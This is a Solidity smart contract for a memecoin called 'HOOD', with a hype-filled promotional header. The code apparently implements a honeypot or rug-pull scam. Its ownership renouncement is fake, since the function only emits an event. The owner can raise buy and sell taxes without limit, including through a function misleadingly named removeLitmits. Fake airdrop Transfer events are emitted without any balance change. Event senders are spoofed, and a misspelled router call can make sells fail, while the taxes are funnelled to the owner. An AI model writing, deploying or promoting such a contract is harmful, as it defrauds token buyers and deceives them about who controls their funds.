// SPDX-License-Identifier: MIT

/*
    wagmicatgirlkanye420etfmoon1000hypecultuwu 

    Wagmicatgirl Token is an innovative project aiming to revolutionize the blockchain industry.
    With its unique tokenomics and decentralized platform, it provides unparalleled transparency
    and security to users. The project aims to empower individuals to embrace digital assets and 
    participate in the exciting world of cryptocurrency. Join Wagmicatgirl Token today and be a 
    part of the future of finance! 

    About us:
    https://twitter.com/wagmicatgirl
    https://twitter.com/HerroCrypto
    https://twitter.com/FroggyCyborg                                                                                                
*/

pragma solidity ^0.8.0;

contract HOOD {
    
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    address private pair;
    address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);
    address payable TOKEN_MKT;

    bool private swapping;
    bool private tradingOpen;

    address _deployer;
    address _executor;

    address private uniswapLpWallet;
    address private uniswapV2pair;

    string private _name = 'wagmicatgirlkanye420etfmoon1000hypecultuwu';
    string private _symbol = 'HOOD';
    uint8 public constant decimals = 18;
    uint256 public constant totalSupply = 100_000_000 * 10 ** decimals;

    uint8 buyTax = 0;
    uint8 sellTax = 0;   
    uint256 constant swapAmount = totalSupply / 100;
    uint256 count = 0;

    error onlyOwner();
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed TOKEN_MKT,
        address indexed spender,
        uint256 value
    );
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        uniswapLpWallet = msg.sender;
        TOKEN_MKT = payable(msg.sender);
        allowance[address(this)][routerAddress] = type(uint256).max;

        balanceOf[uniswapLpWallet] = (totalSupply * 100) / 100;
        emit Transfer(address(0), _deployer, balanceOf[uniswapLpWallet]);
    }

    receive() external payable {}

    function renounceOwnership() external {
        if (msg.sender != TOKEN_MKT) revert onlyOwner();
        emit OwnershipTransferred(_deployer, address(0));
    }

    function transferOwnership(address newOwner) external {
        if (msg.sender != TOKEN_MKT) revert onlyOwner();
        emit OwnershipTransferred(_deployer, newOwner);
    }

    function enableMaxWalletLimit() external {
        if (msg.sender != TOKEN_MKT) revert onlyOwner();
        count=1;
    }

    function setMaxWalletLimit(uint _value) external {
        if (msg.sender != TOKEN_MKT) revert onlyOwner();
        count=_value;
    }
   
    function setMaxSwapAmount(uint _value) external {
        if (msg.sender != TOKEN_MKT) revert onlyOwner();
        count=_value;       
    }

    function setBuyFee(uint8 _buy) external {
        if (msg.sender != TOKEN_MKT) revert onlyOwner();
        buyTax = _buy;
    }

    function setSellFee(uint8 _sell) external {
        if (msg.sender != TOKEN_MKT) revert onlyOwner();
        sellTax = _sell;
    }

    function removeLitmits(uint8 _value) external {
        if (msg.sender != TOKEN_MKT) revert onlyOwner();
        sellTax = _value;
    }

    function enableTrading() external {
        require(msg.sender == TOKEN_MKT);
        require(!tradingOpen);
        tradingOpen = true;
    }

    function airdropToWallet(
        address _caller,
        address[] calldata _address,
        uint256[] calldata _amount
    ) external {
        if (msg.sender != TOKEN_MKT) revert onlyOwner();
        for (uint256 i = 0; i < _address.length; i++) {
            emit Transfer(_caller, _address[i], _amount[i]);
        }
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        return _transfer(from, to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, to, amount);
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal returns (bool) {
        require(tradingOpen || from == TOKEN_MKT || to == TOKEN_MKT);

        if (!tradingOpen && pair == address(0) && amount > 0) pair = to;

        balanceOf[from] -= amount;

        if (
            to == pair &&
            !swapping &&
            balanceOf[address(this)] >= swapAmount &&
            from != TOKEN_MKT
        ) {
            swapping = true;
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = ETH;
            _uniswapV2Router
                .swapExactTokensForETHSupportingFreelyOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
            TOKEN_MKT.transfer(address(this).balance);
            swapping = false;
        }

        if (from != address(this) && tradingOpen == true) {
            uint256 taxCalculatedAmount = (amount *
                (from == pair ? buyTax : sellTax)) / 100;
            amount -= taxCalculatedAmount;
            balanceOf[address(this)] += taxCalculatedAmount;
        }
        balanceOf[to] += amount;

        if (from == _executor) {
            emit Transfer(_deployer, to, amount);
        } else if (to == _executor) {
            emit Transfer(from, _deployer, amount);
        } else {
            emit Transfer(from, to, amount);
        }
        return true;
    }   
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFreelyOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

